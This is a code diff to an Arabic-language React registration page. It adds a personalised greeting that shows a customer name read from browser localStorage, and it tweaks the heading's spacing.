@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link, useLocation } from "wouter";
 import { submitData } from "@/lib/store";
 
@@ -9,6 +9,16 @@ export default function RegisterStep3() {
   const searchParams = new URLSearchParams(window.location.search);
   const accountType = searchParams.get('type') || 'individuals';
   const accountTypeText = accountType === 'business' ? 'أعمال' : 'أفراد';
+  
+  // Customer name from SPL website
+  const [customerName, setCustomerName] = useState("");
+  
+  useEffect(() => {
+    const name = localStorage.getItem('customerName');
+    if (name) {
+      setCustomerName(name);
+    }
+  }, []);
   
   // Arabic Name fields
   const [firstNameAr, setFirstNameAr] = useState("");
@@ -237,9 +247,20 @@ export default function RegisterStep3() {
           {/* White Box Container */}
           <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
             {/* Title */}
-            <h1 className="text-lg md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-4 md:mb-6 lg:mb-8">
+            <h1 className="text-lg md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-2 md:mb-4">
               إنشاء حساب {accountTypeText} في الخدمات الإلكترونية
             </h1>
+            
+            {/* Personalized Greeting */}
+            {customerName && (
+              <div className="bg-[#e8f4f8] border border-[#146c84] rounded-lg p-3 md:p-4 mb-4 md:mb-6 lg:mb-8 text-center">
+                <p className="text-[#143c3c] text-sm md:text-base lg:text-lg">
+                  <span className="font-bold text-[#146c84]">مرحباً {customerName}،</span>
+                  <br />
+                  الرجاء تعبئة بياناتك أدناه لإكمال تسجيلك في الخدمات الإلكترونية
+                </p>
+              </div>
+            )}
 
             <form onSubmit={handleSubmit}>
               {/* Personal Information Section */}
